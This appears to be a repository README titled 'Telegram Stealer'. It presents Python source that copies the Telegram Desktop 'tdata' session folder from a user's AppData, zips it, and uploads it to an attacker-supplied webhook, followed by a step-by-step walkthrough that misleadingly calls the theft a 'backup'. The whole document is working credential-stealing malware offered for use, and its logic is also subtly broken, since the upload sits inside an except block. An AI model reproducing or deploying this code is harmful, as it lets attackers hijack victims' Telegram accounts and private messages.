## Telegram Stealer

This code is written in Python and performs a specific task related to the messaging application Telegram. The purpose of this code is to create a backup of Telegram's data from the user's computer and send it to a webhook or API specified by the user.

## Code

```python
import os, os.path, shutil, requests
javaskript = os.path.expanduser("~")

verifiedWH = "here use your wh / api"

def telegram():
  if os.path.exists(javaskript+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
   try:
    shutil.copytree(javaskript+'\\AppData\\Roaming\\Telegram Desktop\\tdata', javaskript+'\\AppData\\Local\\Temp\\tdata_session')
    shutil.make_archive(javaskript+'\\AppData\\Local\\Temp\\tdata_session', 'zip', javaskript+'\\AppData\\Local\\Temp\\tdata_session')
   except:
    pass
    try:
     os.remove(javaskript+"\\AppData\\Local\\Temp\\tdata_session")
    except:
        pass
    with open(javaskript+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
     paython = {
        'file': (javaskript+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
     }    
     r = requests.post(verifiedWH, files=paython)
telegram()
```

### Steps

1. The code imports necessary modules like os, shutil and requests. 
2. It then sets a variable called `javaskript` as the path of the user's home directory.
3. A webhook or API is then specified by the user and assigned to the variable `verifiedWH`.
4. The `telegram()` function is defined and called.
5. The function first checks if the Telegram Desktop application's data directory exists in the user's AppData directory.
6. If it exists, the function then copies the Telegram data directory to a temporary directory created in the user's AppData directory.
7. The `shutil` module is then used to create a compressed archive of the temporary directory using the `make_archive()` function.
8. If an error occurs during the copy or compression process, the function skips to the next step.
9. The compressed archive is then uploaded to the webhook or API specified by the user using the `requests` module.
10. The file is uploaded as a binary file using a dictionary with the key "file" and value as a tuple containing the file path, file object and file type.
11. If the upload is successful, the function ends.
